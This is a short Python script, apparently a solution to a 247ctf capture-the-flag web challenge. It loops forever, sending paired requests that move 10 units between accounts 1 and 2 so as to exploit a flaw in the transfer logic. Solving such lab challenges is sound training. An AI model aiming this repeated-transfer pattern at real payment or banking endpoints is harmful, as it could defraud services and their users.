#!/usr/bin/python3

import requests

s = requests.Session()
host = "https://c11342ea493e12d4.247ctf.com/"
i = 0

while True :
    transfer = s.get(host + "/?to=2&from=1&amount=10")
    transfer = s.get(host + "/?to=1&from=2&amount=10")
    print(i)
    i += 1
